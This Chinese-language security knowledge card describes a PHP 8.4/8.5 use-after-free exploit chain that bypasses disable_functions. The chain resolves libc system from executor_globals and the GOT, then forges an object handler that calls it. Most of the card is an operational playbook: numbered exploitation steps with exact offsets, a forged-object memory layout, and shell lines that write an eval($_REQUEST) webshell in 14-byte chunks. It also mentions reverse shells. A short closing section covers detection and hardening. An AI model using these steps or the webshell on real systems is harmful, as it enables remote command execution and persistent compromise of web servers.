---
id: web-php-rce-uaf-memory-corruption-disable-functions-bypass
title: PHP 8 UAF 内存破坏解析 zif_system 绕过 disable_functions
type: scenario
domain: web
path: web/php/rce
technique: uaf-memory-corruption-disable-functions-bypass
aliases:
- PHP8 bypass disable_functions
- zif_system 内存指针绕过
- PHP UAF 任意内存读写 RCE
- executor_globals function_table 解析
- 蚁剑 PHP8 UAF 插件
tags:
- php
- php8
- disable-functions
- uaf
- memory-corruption
- rce
- webshell
- bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: PHP 8.4、8.5（原文公开利用插件适配；根因可追溯至 PHP 5.1+ 的 Serializable 实现）
verification:
  verified_by: verifier-V35
  verified_at: '2026-11-05T06:09:59+08:00'
  notes: 已对照原文核对：完整 PoC 脚本（堆泄露→ELF/.gnu_hash/GOT→EG class_table→bin-320 spray 槽→伪造对象 handler=system）、14 字节命令拼接；截图显示 disable_functions 含 system/shell_exec/passthru 等时仍以 www-data 执行 ls /，蚁剑插件 PHP 8.5 UAF Bypass 可用。未在本机复现。
---

## 一句话结论

在已获得 PHP 进程内 UAF/任意内存读写的条件下，可以绕过 `disable_functions`：从 `executor_globals` 的 `function_table` 解析 `system` 的 C 函数指针（或从 GOT 找 libc `system`），再伪造对象的 handler 指向该指针并触发调用，命令执行不经过 PHP 用户态函数禁用检查，因此 `system`/`shell_exec` 等即使被禁用也能执行。

## 原理

- `disable_functions` 工作在 PHP 用户态的函数查找/注册层：被禁用的函数不会以可调用形式出现在函数表中，用户代码调用时返回“has been disabled”。
- 内存破坏利用跳过了这一层：攻击者直接读取 PHP 内部结构，拿到 `EG(function_table)` 中 `system` 对应的 `zend_internal_function`，其 `handler` 就是 `zif_system` 的代码地址；或者转储 libphp 的 GOT 找到 libc 基址并解析 `system` 的地址。
- 随后构造一个伪造的 `zend_object`，把 `handlers->get_properties_for`（PHP 8.4/8.5 偏移 0x60）改为 `system`，并让伪造对象的起始字节就是 shell 命令。引擎对伪造对象调用该 handler 时，第一个参数就是对象指针，等价于 `system(command_bytes)`，完全不经过 `disable_functions` 的检查。
- 公开 PoC 的关键技巧：对象 GC header 同时充当命令缓冲区，命令前加 `0x09`，`GC_ADDREF` 的 refcount 自增把它变成 `0x0A`（换行），shell 会忽略；单次命令因此被限制在 14 字节左右。
- 地址链：UAF 喷射字符串改写 zval 泄露堆地址 → 在堆附近扫描 ELF 头定位 libphp → 解析 `.gnu_hash` 得 `executor_globals` 和 `_GLOBAL_OFFSET_TABLE_` → 用 `DT_PLTRELSZ` 作为假字符串长度转储 GOT，找 libc 与 `system` → 读 `EG.class_table` 找 `stdClass` class entry → 在 320 字节 bin 的 spray 槽中伪造对象。

## 触发条件

- PHP 8.4/8.5（公开插件适配版本，其他版本偏移不同），且目标启用了 `disable_functions` 禁用了命令执行函数。
- 攻击者已掌握一个可稳定触发的 PHP 进程内存破坏原语，例如 Serializable 嵌套反序列化的 `var_hash` UAF（见关联卡），能完成堆泄露与重复喷射。
- 目标进程可被多次 HTTP 请求触发，允许进行上千次内存探测；libc `system` 可用，未被 seccomp/AppArmor 等额外机制阻断。
- 目标 PHP 以 Web 用户运行，成功后的命令权限即该用户权限，不是系统 root。

## 利用步骤

1. 先取得 UAF 原语：构造 `C:` 对象与内层 8 属性 `stdClass`，通过 `R:` 引用触发悬垂指针；用 280 字节字符串喷射回收被释放的 `arData`。
2. 泄露堆地址：让 `R:` 引用改写喷射字符串中的 zval，解析响应里被覆盖的指针。
3. 定位 libphp：从堆地址按页/大页步进扫描 ELF 头（校验 `e_ehsize`/`e_phentsize`/`e_phnum`）；对候选解析 `.gnu_hash`，能解析出 `executor_globals` 的即为 libphp。
4. 找 libc/`system`：读取 libphp 的 `.dynamic`，定位 `DT_PLTGOT`/`DT_PLTRELSZ`，把 `DT_PLTRELSZ` 的值当作假字符串长度读取 GOT 区域；对 GOT 中的外部指针回溯扫描 ELF 头定位 libc，再解析 `system`。
5. 找 class entry：读 `EG + 0x1D0` 的 `class_table`，按 DJBX33A 哈希查小写 `stdclass`，得到 `zend_class_entry*`。
6. 找 spray 槽：读 ZendMM chunk 头与页映射，定位 bin-320 的 SRUN 页，逐 320 字节槽探测长度为 280 的喷射字符串，得到数据地址 `S`。
7. 伪造并触发：在 `S+104` 构造对象，`[+0x00]` 放 `"\t"+命令`，`[+0x10]` 放 stdClass ce，`[+0x18]` 放 handlers=`S`，`[handlers+0x60]` 放 `system`；用 `R:` 引用触发。长命令拆成多条 14 字节 `echo -n ...>>w`，最后 `mv w c.php` 落 webshell 或 `bash w&` 反弹。
8. 验证：执行 `id`/`ls /`，或访问落地 webshell；图中示例以 `www-data` 身份成功执行命令。

## PoC

```text
# 伪造对象内存布局（S 为喷射字符串数据地址，PHP 8.4/8.5 公开 PoC 偏移）
S+104  +0x00 : "\t" + 14 字节以内命令 + "\0"   # GC header 兼作 system 参数
S+104  +0x10 : stdClass zend_class_entry 指针
S+104  +0x18 : handlers 指针 = S
S      +0x60 : handlers->get_properties_for = libc system 地址
```

```bash
# 触发后单次最多 14 字节，长命令分多次：
echo -n <?=eval($_REQ>>w
echo -n UEST[1])?>>>w
mv w c.php
```

```text
# 关键内存解析结果示意（来自公开 PoC 运行日志）
libphp @ 0x7f1841b2d000
executor_globals @ ...；class_table @ ...；stdclass ce @ 0x...
system() @ 0x7f1841b80110
Bin-320 SRUN at page 117；Found spray at slot 5；S = ...
RCE SUCCESS: uid=33(www-data)
```

完整脚本是多阶段上千请求的堆/ELF/GOT 扫描器，最小 PoC 只保留上述伪造对象布局与触发思路；不要在本机直接运行来源不明的 PoC。

## 变体与关联

- 变体：不劫持 `get_properties_for`，而是伪造闭包/对象并篡改函数执行指针指向 `zif_system`，配合伪造的 `execute_data` 传入命令；公开蚁剑插件即从模块函数入口表解析 `zif_system`。
- 变体：只绕过 `disable_functions` 而不落地文件，单次 14 字节命令直接写 `/dev/shm` 或反弹 shell。
- 关联：[[web-php-deserialization-serializable-nested-unserialize-var-hash-uaf]]（前置内存破坏原语）；[[web-php-rce-disable-functions-ld-preload]]（对比：通过子进程环境变量劫持，不依赖内存破坏）；[[web-php-rce-htaccess-cgi-addhandler-bypass-disable-functions]]（对比：通过 CGI 执行绕过）。
- 边界：`disable_functions` 只是 PHP 层限制，本技术证明它不能防御内存破坏；但 seccomp、AppArmor、容器、`open_basedir` 和低权限账户仍会显著限制命令执行后果。

## 检测与防御

- 检测：监控 PHP-FPM 进程异常崩溃/重启、同一端点大量包含 `C:`/`R:` 的序列化请求、PHP 进程发起的 `execve`（auditd/eBPF）、DocumentRoot 下异常新增文件与 `bash -i`/`/dev/tcp` 连接。
- 修复：升级 PHP 修复底层 UAF；不在不可信输入上调用 `unserialize()`；对必须反序列化的数据使用 `allowed_classes` 白名单。
- 加固：不要依赖 `disable_functions` 作为安全边界；使用 `open_basedir`、只读文件系统、容器/seccomp/AppArmor 限制 PHP 进程的写文件与系统调用，低权限运行 PHP-FPM，并限制出网。
